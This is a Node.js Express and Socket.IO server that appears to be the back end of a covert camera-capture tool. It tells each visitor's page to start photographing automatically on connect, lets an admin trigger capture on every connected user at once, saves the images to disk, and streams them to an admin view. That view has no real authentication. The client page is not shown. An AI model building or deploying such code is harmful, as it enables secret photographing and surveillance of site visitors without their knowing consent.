const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Memory Cache for Offline Photos Retention
let storedPhotos = [];
let isAutoCaptureOn = true;

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.use(express.static(__dirname));
app.use('/uploads', express.static(uploadDir));

io.on('connection', (socket) => {

    socket.on('admin-auth-success', () => {
        // Send all stored/offline photos to newly connected admin
        socket.emit('load-stored-photos', storedPhotos);
    });

    socket.on('user-ready', () => {
        if (isAutoCaptureOn) {
            socket.emit('start-auto-capture');
        }
    });

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
        const fileName = `photo_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        const photoObj = { imageData, fileName };
        storedPhotos.push(photoObj);

        // Keep last 30 photos in cache to optimize server memory
        if (storedPhotos.length > 30) {
            storedPhotos.shift();
        }

        // Broadcast to live Admin
        io.emit('send-photo-to-admin', photoObj);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});